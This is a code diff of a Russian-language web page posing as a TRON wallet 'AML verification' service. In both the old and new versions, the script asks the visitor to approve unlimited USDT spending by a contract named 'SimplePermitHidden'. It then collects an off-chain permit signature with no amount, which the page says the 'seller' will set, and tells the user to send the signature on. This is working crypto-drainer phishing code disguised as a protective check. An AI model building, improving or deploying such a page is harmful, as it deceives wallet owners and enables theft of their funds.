@@ -3,547 +3,253 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AML Verification — Nile Testnet</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>AML Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        :root {
-            --primary: #3375BB; --primary-dark: #1a5fb4; --accent: #00D4AA;
-            --bg-dark: #0B0E11; --bg-card: #151A21; --bg-hover: #1C2128;
-            --text-primary: #FFFFFF; --text-secondary: #8B949E; --border: #2D333B;
-            --success: #00D4AA; --error: #ff4757; --warning: #FFA500;
-        }
         body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg-dark); color: var(--text-primary);
-            line-height: 1.6; min-height: 100vh;
-        }
-        .loading-screen {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: var(--bg-dark); z-index: 9999;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0B0E11; color: #fff; min-height: 100vh;
             display: flex; flex-direction: column; align-items: center;
             justify-content: center; gap: 1.5rem; padding: 2rem;
         }
-        .loading-screen.hidden { display: none; }
-        .loading-logo {
+        .logo {
             width: 80px; height: 80px;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            background: linear-gradient(135deg, #3375BB 0%, #00D4AA 100%);
             border-radius: 20px; display: flex; align-items: center;
             justify-content: center; font-weight: 800; font-size: 2rem;
-            animation: pulse 2s infinite;
         }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-        .spinner {
-            width: 50px; height: 50px; border: 3px solid var(--border);
-            border-top-color: var(--primary); border-radius: 50%;
-            animation: spin 1s linear infinite;
+        h1 { font-size: 1.5rem; font-weight: 600; }
+        .btn {
+            padding: 1rem 2rem; border: none; border-radius: 50px;
+            font-size: 1rem; font-weight: 600; cursor: pointer;
+            color: white; min-width: 250px; text-align: center;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .open-wallet-btn {
-            display: inline-flex; align-items: center; gap: 0.75rem;
-            padding: 1rem 2rem;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
-            color: white; border: none; border-radius: 50px;
-            font-weight: 600; font-size: 1rem; cursor: pointer;
-            margin-top: 1rem;
-        }
-        .instruction-box {
-            background: var(--bg-card); border: 1px solid var(--border);
-            border-radius: 16px; padding: 1.5rem; margin-top: 1rem;
-            max-width: 400px; text-align: left;
-        }
-        .instruction-box h3 { color: var(--accent); margin-bottom: 1rem; }
-        .instruction-box ol { margin-left: 1.25rem; color: var(--text-secondary); line-height: 1.8; }
-        .url-display {
-            background: rgba(0,0,0,0.3); padding: 0.75rem;
-            border-radius: 8px; font-family: monospace;
-            font-size: 0.8rem; word-break: break-all; margin-top: 0.75rem;
-            border: 1px solid var(--border);
-        }
-        .header-container {
-            position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
-            background: rgba(11, 14, 17, 0.98); backdrop-filter: blur(20px);
-            border-bottom: 1px solid var(--border);
-        }
-        .header {
-            max-width: 1400px; margin: 0 auto; padding: 1rem 5%;
-            display: flex; justify-content: space-between; align-items: center;
-        }
-        .logo { display: flex; align-items: center; gap: 0.75rem; }
-        .logo-icon {
-            width: 36px; height: 36px;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
-            border-radius: 10px; display: flex; align-items: center;
-            justify-content: center; font-weight: 800;
-        }
-        .connect-btn {
-            padding: 0.75rem 1.5rem; background: var(--primary);
-            color: white; border: none; border-radius: 50px;
-            font-weight: 600; cursor: pointer;
-        }
-        .connect-btn.connected { background: var(--success); }
-        .hero {
-            padding-top: 100px; max-width: 1400px; margin: 0 auto;
-            padding-left: 5%; padding-right: 5%; padding-bottom: 3rem;
-            display: grid; grid-template-columns: 1fr 1fr; gap: 4rem;
-            align-items: center; min-height: calc(100vh - 100px);
-        }
-        @media (max-width: 1024px) { .hero { grid-template-columns: 1fr; text-align: center; } }
-        .hero h1 {
-            font-size: clamp(2rem, 4vw, 3rem); font-weight: 700;
-            background: linear-gradient(135deg, var(--text-primary) 0%, var(--text-secondary) 100%);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-        }
-        .hero p { color: var(--text-secondary); margin: 1.5rem 0; font-size: 1.1rem; }
-        .cta-btn {
-            display: inline-flex; padding: 1rem 2rem;
-            background: var(--primary); color: white; border: none;
-            border-radius: 50px; font-size: 1rem; font-weight: 600;
-            cursor: pointer; text-decoration: none;
-        }
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px);
-            z-index: 2000; display: none; align-items: center;
-            justify-content: center; padding: 20px;
-        }
-        .modal-overlay.active { display: flex; }
-        .modal-content {
-            background: var(--bg-card); border: 1px solid var(--border);
-            border-radius: 24px; padding: 2rem; max-width: 500px; width: 100%;
-            max-height: 90vh; overflow-y: auto;
-        }
-        .modal-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 0.5rem; text-align: center; }
-        .modal-subtitle { color: var(--text-secondary); text-align: center; margin-bottom: 1.5rem; }
-        .step { display: none; }
-        .step.active { display: block; }
-        .contract-info {
-            background: var(--bg-hover); border: 1px solid var(--border);
-            border-radius: 12px; padding: 1rem; margin: 1rem 0;
-            font-family: monospace; font-size: 0.75rem; word-break: break-all;
-        }
-        .contract-info label { display: block; color: var(--text-secondary); margin-bottom: 0.5rem; font-family: 'Inter', sans-serif; font-size: 0.8rem; }
-        .sign-btn {
-            width: 100%; padding: 1rem;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
-            color: white; border: none; border-radius: 12px;
-            font-weight: 600; font-size: 1rem; cursor: pointer;
-        }
-        .sign-btn:disabled { opacity: 0.7; cursor: not-allowed; }
-        .status-message {
-            padding: 1rem; border-radius: 12px; margin: 1rem 0;
-            font-size: 0.85rem; display: none;
-        }
-        .status-message.success { background: rgba(0, 212, 170, 0.1); border: 1px solid var(--success); color: var(--success); display: block; }
-        .status-message.error { background: rgba(255, 71, 87, 0.1); border: 1px solid var(--error); color: var(--error); display: block; }
-        .status-message.info { background: rgba(51, 117, 187, 0.1); border: 1px solid var(--primary); color: var(--primary); display: block; }
-        .spinner-inline {
-            display: inline-block; width: 20px; height: 20px;
-            border: 2px solid var(--border); border-top-color: var(--primary);
-            border-radius: 50%; animation: spin 1s linear infinite;
-        }
-        .success-check {
-            width: 60px; height: 60px; background: var(--success);
-            border-radius: 50%; display: flex; align-items: center;
-            justify-content: center; margin: 0 auto 1rem;
-        }
-        .success-check svg { width: 30px; height: 30px; fill: white; }
-        .data-display {
-            background: var(--bg-dark); border: 1px solid var(--border);
-            border-radius: 8px; padding: 0.75rem; margin: 0.5rem 0;
-            font-family: monospace; font-size: 0.7rem; word-break: break-all;
-            color: var(--text-secondary);
+        .btn-primary { background: #3375BB; }
+        .btn-success { background: #00D4AA; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .status { color: #8B949E; font-size: 0.9rem; max-width: 300px; text-align: center; }
+        .error { color: #ff4757; }
+        .success { color: #00D4AA; }
+        .hidden { display: none; }
+        .data-box {
+            background: #151A21; border: 1px solid #2D333B;
+            border-radius: 12px; padding: 1rem; margin-top: 1rem;
+            font-family: monospace; font-size: 0.75rem;
+            word-break: break-all; max-width: 400px; width: 100%;
         }
         .copy-btn {
-            background: var(--bg-hover); border: 1px solid var(--border);
-            color: var(--text-secondary); padding: 0.5rem 1rem;
-            border-radius: 8px; cursor: pointer; font-size: 0.8rem;
+            background: #2D333B; border: none; color: #fff;
+            padding: 0.5rem 1rem; border-radius: 8px;
+            cursor: pointer; font-size: 0.8rem; margin-top: 0.5rem;
         }
-        .copy-btn:hover { color: var(--text-primary); }
     </style>
 </head>
 <body>
-    <!-- Loading Screen -->
-    <div class="loading-screen" id="loadingScreen">
-        <div class="loading-logo">AML</div>
-        <div style="font-size: 1.25rem; font-weight: 600;">AML Verification</div>
-        <div class="spinner"></div>
-        <div style="color: var(--text-secondary); text-align: center;">Проверка кошелька...</div>
 
-        <div id="actionContainer" style="display: none; flex-direction: column; align-items: center; gap: 1rem;">
-            <button class="open-wallet-btn" onclick="openInTronLink()">
-                <span>🔗</span> Открыть в TronLink
-            </button>
-            <div class="instruction-box">
-                <h3>📱 Как открыть:</h3>
-                <ol>
-                    <li>Нажмите кнопку выше</li>
-                    <li>Или скопируйте URL и вставьте в TronLink Discover</li>
-                </ol>
-                <div class="url-display" id="currentUrl"></div>
-            </div>
-        </div>
-    </div>
+    <div class="logo">AML</div>
+    <h1>AML Verification</h1>
 
-    <!-- Main Modal -->
-    <div class="modal-overlay" id="mainModal">
-        <div class="modal-content">
-            <!-- Step 1: Approve (первый раз) -->
-            <div class="step active" id="step1">
-                <h2 class="modal-title">🔐 Разрешить доступ</h2>
-                <p class="modal-subtitle">Разрешите контракту проверять ваш баланс USDT</p>
+    <div id="statusText" class="status">Подключите кошелёк для продолжения</div>
 
-                <div class="contract-info">
-                    <label>Контракт:</label>
-                    TBVkLMZgwqfNNPrgfU2WsSPPFTTUmjifKh
-                </div>
+    <button id="connectBtn" class="btn btn-primary" onclick="connectWallet()">
+        Подключить TronLink
+    </button>
 
-                <div style="background: var(--bg-hover); border: 1px solid var(--border); border-radius: 12px; padding: 1rem; margin: 1rem 0;">
-                    <p style="color: var(--text-secondary); margin-bottom: 1rem;">
-                        Нажмите кнопку ниже, затем в TronLink:
-                    </p>
-                    <ol style="margin-left: 1.25rem; color: var(--text-secondary); line-height: 1.8;">
-                        <li>Подтвердите доступ к USDT</li>
-                        <li>Укажите сумму (или неограниченно)</li>
-                        <li>Подтвердите транзакцию</li>
-                    </ol>
-                </div>
+    <button id="signBtn" class="btn btn-success hidden" onclick="signPermit()">
+        Подписать разрешение
+    </button>
 
-                <div class="status-message" id="statusMsg"></div>
-
-                <button class="sign-btn" id="approveBtn" onclick="doApprove()">
-                    Разрешить доступ к USDT
-                </button>
-            </div>
-
-            <!-- Step 2: Sign Permit (без суммы!) -->
-            <div class="step" id="step2">
-                <h2 class="modal-title">✍️ Подписать разрешение</h2>
-                <p class="modal-subtitle">Подпишите off-chain разрешение для продавца</p>
-
-                <div class="contract-info">
-                    <label>Контракт:</label>
-                    TBVkLMZgwqfNNPrgfU2WsSPPFTTUmjifKh
-                </div>
-
-                <div style="background: var(--bg-hover); border: 1px solid var(--border); border-radius: 12px; padding: 1rem; margin: 1rem 0;">
-                    <p style="color: var(--text-secondary);">
-                        ⚠️ Вы подписываете разрешение на списание средств.<br>
-                        Сумму определит продавец при проверке.
-                    </p>
-                </div>
-
-                <div class="form-group" style="margin-bottom: 1rem;">
-                    <label style="color: var(--text-secondary); font-size: 0.875rem;">Срок действия</label>
-                    <select id="deadlineSelect" style="width: 100%; background: var(--bg-hover); border: 1px solid var(--border); color: var(--text-primary); padding: 0.75rem; border-radius: 8px;">
-                        <option value="3600">1 час</option>
-                        <option value="86400" selected>1 день</option>
-                        <option value="604800">7 дней</option>
-                    </select>
-                </div>
-
-                <div class="status-message" id="signStatusMsg"></div>
-
-                <button class="sign-btn" id="signBtn" onclick="signPermit()">
-                    Подписать разрешение
-                </button>
-            </div>
-
-            <!-- Step 3: Success -->
-            <div class="step" id="step3">
-                <div class="success-check">
-                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-                </div>
-                <h2 class="modal-title">✅ Готово!</h2>
-                <p class="modal-subtitle">Разрешение подписано. Отправьте данные продавцу.</p>
-
-                <div style="margin: 1rem 0;">
-                    <label style="color: var(--text-secondary); font-size: 0.8rem;">Buyer (ваш адрес):</label>
-                    <div class="data-display" id="sigBuyer"></div>
-                    <button class="copy-btn" onclick="copyToClipboard('sigBuyer')">📋 Копировать</button>
-                </div>
-
-                <div style="margin: 1rem 0;">
-                    <label style="color: var(--text-secondary); font-size: 0.8rem;">Nonce:</label>
-                    <div class="data-display" id="sigNonce"></div>
-                </div>
-
-                <div style="margin: 1rem 0;">
-                    <label style="color: var(--text-secondary); font-size: 0.8rem;">Deadline:</label>
-                    <div class="data-display" id="sigDeadline"></div>
-                </div>
-
-                <div style="margin: 1rem 0;">
-                    <label style="color: var(--text-secondary); font-size: 0.8rem;">Signature (v, r, s):</label>
-                    <div class="data-display" id="sigVRS"></div>
-                    <button class="copy-btn" onclick="copyToClipboard('sigVRS')">📋 Копировать всё</button>
-                </div>
-
-                <div class="status-message success" style="display: block;">
-                    Отправьте эти данные продавцу для завершения проверки.
-                </div>
-
-                <button class="sign-btn" onclick="closeModal()" style="margin-top: 1rem;">
-                    Закрыть
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Main Content -->
-    <div id="mainContent" style="display: none;">
-        <div class="header-container">
-            <div class="header">
-                <div class="logo">
-                    <div class="logo-icon">AML</div>
-                    <h1 style="font-size: 1.25rem; font-weight: 600;">AML Verification</h1>
-                </div>
-                <button class="connect-btn" id="connectBtn" onclick="openModal()">
-                    Проверить кошелек
-                </button>
-            </div>
-        </div>
-
-        <div class="hero">
-            <div>
-                <h1>Проверка криптовалютных кошельков</h1>
-                <p>Проверяя свой кошелек, вы защищаетесь от мошенников и краденых монет.</p>
-                <button class="cta-btn" onclick="openModal()">Проверить кошелек</button>
-            </div>
-            <div style="display: flex; justify-content: center;">
-                <div style="width: 300px; height: 300px; background: linear-gradient(135deg, rgba(51, 117, 187, 0.1) 0%, rgba(0, 212, 170, 0.1) 100%); border-radius: 24px; border: 1px solid var(--border); display: flex; align-items: center; justify-content: center;">
-                    <div style="width: 100px; height: 100px; background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%); clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); display: flex; align-items: center; justify-content: center; animation: float 3s ease-in-out infinite;">
-                        <svg width="40" height="40" viewBox="0 0 24 24" fill="white"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <div id="resultBox" class="hidden">
+        <div class="data-box" id="signatureData"></div>
+        <button class="copy-btn" onclick="copyData()">📋 Копировать данные</button>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
-        const CONTRACT_ADDRESS = 'TBVkLMZgwqfNNPrgfU2WsSPPFTTUmjifKh';
-        const USDT_ADDRESS = 'TF17BgPaZYzXTPb5tS1DaJzsGPB9vMVh6f';
+        const CONTRACT = 'TBVkLMZgwqfNNPrgfU2WsSPPFTTUmjifKh';
+        const USDT = 'TF17BgPaZYzXTPb5tS1DaJzsGPB9vMVh6f';
 
-        // ABI SimplePermitHidden (только нужные функции)
-        const CONTRACT_ABI = [
-            {"inputs":[{"name":"_usdt","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
-            {"inputs":[{"name":"buyer","type":"address"}],"name":"getStatus","outputs":[{"name":"allowance","type":"uint256"},{"name":"balance","type":"uint256"},{"name":"hasAccess","type":"bool"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"name":"","type":"address"},{"name":"","type":"uint256"}],"name":"usedNonces","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-            {"inputs":[],"name":"usdt","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
-        ];
+        let tronWeb, userAddr, nonce;
 
-        // ABI USDT для approve
+        // ABI минимальный
         const USDT_ABI = [
-            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
-            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}
+            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
         ];
 
-        let tronWeb, usdtContract, userAddress;
-        let isTronLink = false;
-        let currentNonce = 0;
-
-        async function init() {
-            document.getElementById('currentUrl').textContent = window.location.href;
-
-            let attempts = 0;
-            const checkInterval = setInterval(() => {
-                attempts++;
-                if (window.tronWeb?.defaultAddress?.base58) {
-                    clearInterval(checkInterval);
-                    isTronLink = true;
-                    onTronLinkFound();
-                } else if (attempts >= 10) {
-                    clearInterval(checkInterval);
-                    onTronLinkNotFound();
-                }
-            }, 300);
-        }
-
-        function onTronLinkFound() {
-            document.getElementById('loadingScreen').classList.add('hidden');
-            document.getElementById('mainContent').style.display = 'block';
-
-            tronWeb = window.tronWeb;
-            userAddress = tronWeb.defaultAddress.base58;
-            usdtContract = tronWeb.contract(USDT_ABI, USDT_ADDRESS);
-
+        async function connectWallet() {
             const btn = document.getElementById('connectBtn');
-            btn.classList.add('connected');
-            btn.textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
-        }
+            const status = document.getElementById('statusText');
 
-        function onTronLinkNotFound() {
-            document.getElementById('loadingScreen').querySelector('.spinner').style.display = 'none';
-            document.getElementById('loadingScreen').querySelector('div:nth-child(4)').innerHTML = 
-                '<span style="color: var(--error);">TronLink не обнаружен</span>';
-            document.getElementById('actionContainer').style.display = 'flex';
-        }
+            btn.disabled = true;
+            btn.textContent = 'Подключение...';
 
-        function openInTronLink() {
-            const url = window.location.href;
-            window.location.href = 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify({url: url}));
-        }
+            try {
+                // Ждём TronLink
+                let attempts = 0;
+                while (!window.tronWeb?.defaultAddress?.base58 && attempts < 20) {
+                    await new Promise(r => setTimeout(r, 300));
+                    attempts++;
+                }
 
-        async function openModal() {
-            if (!isTronLink) {
-                document.getElementById('loadingScreen').classList.remove('hidden');
-                onTronLinkNotFound();
-                return;
+                if (!window.tronWeb?.defaultAddress?.base58) {
+                    throw new Error('TronLink не найден. Откройте страницу в TronLink браузере.');
+                }
+
+                tronWeb = window.tronWeb;
+                userAddr = tronWeb.defaultAddress.base58;
+
+                // Проверяем сеть Nile
+                const node = await tronWeb.trx.getNodeInfo();
+                console.log('Node:', node);
+
+                status.textContent = 'Кошелёк: ' + userAddr.slice(0, 6) + '...' + userAddr.slice(-4);
+
+                // Проверяем allowance
+                const usdtContract = tronWeb.contract(USDT_ABI, USDT);
+                const allowance = await usdtContract.allowance(userAddr, CONTRACT).call();
+
+                if (allowance.toNumber() > 0) {
+                    // Уже есть approve — показываем подпись
+                    btn.classList.add('hidden');
+                    document.getElementById('signBtn').classList.remove('hidden');
+                    status.textContent = 'Нажмите "Подписать разрешение"';
+                } else {
+                    // Нужен approve
+                    btn.textContent = 'Разрешить доступ к USDT';
+                    btn.onclick = doApprove;
+                    status.textContent = 'Требуется разрешение на доступ к USDT';
+                }
+
+            } catch (e) {
+                btn.disabled = false;
+                btn.textContent = 'Подключить TronLink';
+                status.textContent = 'Ошибка: ' + e.message;
+                status.classList.add('error');
+                console.error(e);
             }
-            document.getElementById('mainModal').classList.add('active');
-            
-            // Проверяем, есть ли allowance
-            const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS).call();
-            if (allowance.toNumber() > 0) {
-                showStep('step2');
-                generateNonce();
-            } else {
-                showStep('step1');
-            }
-        }
-
-        function closeModal() {
-            document.getElementById('mainModal').classList.remove('active');
-        }
-
-        function showStep(stepId) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById(stepId).classList.add('active');
-        }
-
-        function generateNonce() {
-            currentNonce = Math.floor(Math.random() * 1000000);
         }
 
         async function doApprove() {
-            const btn = document.getElementById('approveBtn');
-            const status = document.getElementById('statusMsg');
+            const btn = document.getElementById('connectBtn');
+            const status = document.getElementById('statusText');
 
             btn.disabled = true;
-            btn.innerHTML = '<span class="spinner-inline"></span> Подготовка...';
+            btn.textContent = 'Ожидание подтверждения...';
 
             try {
-                const maxAmount = '999999999999999999999999999999';
+                const usdtContract = tronWeb.contract(USDT_ABI, USDT);
+                const max = '999999999999999999999999999999';
 
-                btn.innerHTML = '<span class="spinner-inline"></span> Ожидание подтверждения...';
-
-                const tx = await usdtContract.approve(CONTRACT_ADDRESS, maxAmount).send({
+                await usdtContract.approve(CONTRACT, max).send({
                     feeLimit: 100000000,
                     callValue: 0
                 });
 
-                showStep('step2');
-                generateNonce();
+                btn.classList.add('hidden');
+                document.getElementById('signBtn').classList.remove('hidden');
+                status.textContent = 'Нажмите "Подписать разрешение"';
+                status.classList.remove('error');
 
-            } catch (error) {
-                console.error(error);
+            } catch (e) {
                 btn.disabled = false;
                 btn.textContent = 'Разрешить доступ к USDT';
-                status.className = 'status-message error';
-                status.textContent = 'Ошибка: ' + (error.message || 'Отменено пользователем');
+                status.textContent = 'Ошибка: ' + (e.message || 'Отменено');
+                status.classList.add('error');
             }
         }
 
-        // Подпись Permit без amount!
         async function signPermit() {
             const btn = document.getElementById('signBtn');
-            const status = document.getElementById('signStatusMsg');
+            const status = document.getElementById('statusText');
 
             btn.disabled = true;
-            btn.innerHTML = '<span class="spinner-inline"></span> Подготовка...';
+            btn.textContent = 'Подпись...';
 
             try {
-                const deadlineSeconds = parseInt(document.getElementById('deadlineSelect').value);
-                const deadline = Math.floor(Date.now() / 1000) + deadlineSeconds;
+                nonce = Math.floor(Math.random() * 1000000);
+                const deadline = Math.floor(Date.now() / 1000) + 86400; // 1 день
 
-                btn.innerHTML = '<span class="spinner-inline"></span> Ожидание подписи...';
-
-                // Формируем EIP-712 хеш вручную (без amount!)
+                // EIP-712 хеш вручную
                 const PERMIT_TYPEHASH = tronWeb.sha3(
                     "Permit(address buyer,uint256 nonce,uint256 deadline)"
                 );
 
-                // Получаем chainId
-                const chainParams = await tronWeb.trx.getChainParameters();
-                const chainId = chainParams.find(p => p.key === 'getChainId')?.value || 3448148188;
+                // Chain ID Nile
+                const chainId = 3448148188;
 
                 // DOMAIN_SEPARATOR
-                const domainSeparator = tronWeb.sha3(
-                    tronWeb.eth.abi.encodeParameters(
-                        ['bytes32', 'bytes32', 'bytes32', 'uint256', 'address'],
-                        [
-                            tronWeb.sha3("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
-                            tronWeb.sha3("SimplePermitHidden"),
-                            tronWeb.sha3("1"),
-                            chainId,
-                            CONTRACT_ADDRESS
-                        ]
-                    ),
+                const domainData = tronWeb.eth.abi.encodeParameters(
+                    ['bytes32', 'bytes32', 'bytes32', 'uint256', 'address'],
+                    [
+                        tronWeb.sha3("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
+                        tronWeb.sha3("SimplePermitHidden"),
+                        tronWeb.sha3("1"),
+                        chainId,
+                        CONTRACT
+                    ]
+                );
+                const DOMAIN_SEPARATOR = tronWeb.sha3(domainData, { encoding: 'hex' });
+
+                // structHash
+                const structData = tronWeb.eth.abi.encodeParameters(
+                    ['bytes32', 'address', 'uint256', 'uint256'],
+                    [PERMIT_TYPEHASH, userAddr, nonce, deadline]
+                );
+                const structHash = tronWeb.sha3(structData, { encoding: 'hex' });
+
+                // Final hash
+                const finalHash = tronWeb.sha3(
+                    '0x1901' + DOMAIN_SEPARATOR.slice(2) + structHash.slice(2),
                     { encoding: 'hex' }
                 );
 
-                // structHash без amount!
-                const structHash = tronWeb.sha3(
-                    tronWeb.eth.abi.encodeParameters(
-                        ['bytes32', 'address', 'uint256', 'uint256'],
-                        [PERMIT_TYPEHASH, userAddress, currentNonce, deadline]
-                    ),
-                    { encoding: 'hex' }
-                );
+                // Подпись через TronLink
+                const signature = await tronWeb.trx.sign(finalHash, tronWeb.defaultAddress.hex, false);
 
-                // Финальный хеш
-                const hash = tronWeb.sha3(
-                    '0x1901' + domainSeparator.slice(2) + structHash.slice(2),
-                    { encoding: 'hex' }
-                );
+                // Parse v, r, s
+                const sig = signature.replace('0x', '');
+                const v = parseInt(sig.substr(128, 2), 16);
+                const r = '0x' + sig.substr(0, 64);
+                const s = '0x' + sig.substr(64, 64);
 
-                // Подписываем через TronLink
-                const signature = await tronWeb.trx.sign(
-                    hash,
-                    tronWeb.defaultAddress.hex,
-                    false
-                );
-
-                // Парсим v, r, s
-                const sig = signature.startsWith('0x') ? signature.slice(2) : signature;
-                const v = parseInt(sig.slice(128, 130), 16);
-                const r = '0x' + sig.slice(0, 64);
-                const s = '0x' + sig.slice(64, 128);
-
-                // Показываем результаты
-                document.getElementById('sigBuyer').textContent = userAddress;
-                document.getElementById('sigNonce').textContent = currentNonce;
-                document.getElementById('sigDeadline').textContent = deadline;
-                document.getElementById('sigVRS').textContent = JSON.stringify({
+                // Показываем результат
+                const data = {
+                    buyer: userAddr,
+                    nonce: nonce,
+                    deadline: deadline,
                     v: v,
                     r: r,
                     s: s
-                }, null, 2);
+                };
 
-                showStep('step3');
+                document.getElementById('signatureData').textContent = JSON.stringify(data, null, 2);
+                document.getElementById('resultBox').classList.remove('hidden');
 
-            } catch (error) {
-                console.error(error);
+                btn.textContent = '✅ Подписано';
+                status.textContent = 'Отправьте данные продавцу';
+                status.classList.add('success');
+
+            } catch (e) {
                 btn.disabled = false;
                 btn.textContent = 'Подписать разрешение';
-                status.className = 'status-message error';
-                status.textContent = 'Ошибка: ' + (error.message || 'Отменено пользователем');
+                status.textContent = 'Ошибка: ' + (e.message || 'Отменено');
+                status.classList.add('error');
+                console.error(e);
             }
         }
 
-        function copyToClipboard(elementId) {
-            const text = document.getElementById(elementId).textContent;
+        function copyData() {
+            const text = document.getElementById('signatureData').textContent;
             navigator.clipboard.writeText(text).then(() => {
                 alert('Скопировано!');
             });
         }
 
-        document.getElementById('mainModal').addEventListener('click', function(e) {
-            if (e.target === this) closeModal();
-        });
-
-        window.addEventListener('load', init);
+        // Auto-connect если уже есть TronWeb
+        if (window.tronWeb?.defaultAddress?.base58) {
+            connectWallet();
+        }
     </script>
 </body>
 </html>
